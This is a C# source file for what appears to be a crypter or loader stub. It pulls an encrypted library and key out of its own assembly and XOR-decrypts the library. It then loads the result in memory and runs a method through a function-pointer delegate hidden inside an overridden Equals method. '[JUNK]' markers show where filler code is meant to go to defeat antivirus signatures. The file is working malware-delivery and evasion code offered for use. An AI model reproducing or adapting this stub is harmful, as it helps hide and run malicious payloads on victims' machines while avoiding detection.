using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

namespace stub
{
    class @class
    {
        /* What this stub does:
            ---> Gets library key file data
            ---> Get library file data
            ---> Decodes library -> b64
            ---> Decrypts library -> xor
            ---> Loads assembly 
            ---> Invokes { class.void }
        */

        // [JUNK]

        delegate void InvokeDel(Type T, string mtdName);

        delegate void MtdSig();

        // [JUNK]

        void ShitFunc(Type T, string mtdName)
        {
            //  T.InvokeMember(mtdName, BindingFlags.InvokeMethod | BindingFlags.Static | BindingFlags.Public, null, null, null);
            RuntimeMethodHandle mtdHandle = ((MethodInfo)(T.GetMember(mtdName, BindingFlags.InvokeMethod | BindingFlags.Static | BindingFlags.Public)[0])).MethodHandle;
            MtdSig mtd = (MtdSig)Marshal.GetDelegateForFunctionPointer(mtdHandle.GetFunctionPointer(), typeof(MtdSig));
            mtd();
        }

        // [JUNK]

        public override bool Equals(object obj)
        {
            object[] o = (object[])obj;
            Type T = (Type)o[0];
            string s = (string)o[1];
            InvokeDel del = new InvokeDel(ShitFunc);
            del(T, s);
            // dynamic d;

            //            ((Type)o[0]).InvokeMember((string)(o[1]), BindingFlags.InvokeMethod | BindingFlags.Static | BindingFlags.Public, null, null, null);
            return true;
        }

        // [JUNK]

        static void Main(string[] args)
        {

            Assembly asm = Assembly.GetExecutingAssembly();

            byte[] key = KeyFile.GetKeyFile(asm);

            byte[] lib = GetLib.GetExe(asm);

            xor(lib, key);

            asm = Assembly.Load(lib);

            Type t = asm.GetType("class1");

            @class c = new @class();
            if (c.Equals(new object[] { t, "method1" }))
                return;
        }

        // [JUNK]

        static void xor(byte[] input, byte[] key)
        {
            for (int i = 0; i < input.Length; i++)
                input[i] ^= key[i % key.Length];
        }

        // [JUNK]

    }
}
